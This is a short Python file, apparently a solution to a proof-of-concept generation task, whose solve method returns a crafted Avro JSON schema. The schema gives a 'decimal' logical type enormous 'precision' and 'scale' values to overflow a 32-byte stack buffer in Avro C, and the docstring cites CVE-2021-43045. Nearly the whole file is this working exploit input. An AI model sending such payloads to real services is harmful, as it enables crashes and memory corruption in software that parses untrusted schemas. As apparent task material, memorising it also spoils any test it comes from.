import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in Avro C.
        
        The vulnerability (CVE-2021-43045) exists in the schema string generation code 
        (specifically for the 'decimal' logical type). A buffer of size 32 is used to 
        construct a printf format string derived from the 'precision' and 'scale' attributes.
        If these attributes are large integers, the resulting format string exceeds 32 bytes,
        causing a stack buffer overflow.
        
        The PoC is a JSON schema defining a decimal logical type with sufficiently large
        precision and scale values.
        """
        # We use 19-digit integers (fitting in 64-bit signed int) to ensure the 
        # constructed format string "%<precision>.<scale>..." exceeds 32 bytes.
        # Example format string length: 1 (%) + 19 + 1 (.) + 19 + 2 (ld) = 42 bytes.
        
        return (
            b'{"type":"bytes","logicalType":"decimal",'
            b'"precision":1111111111111111111,'
            b'"scale":1111111111111111111}'
        )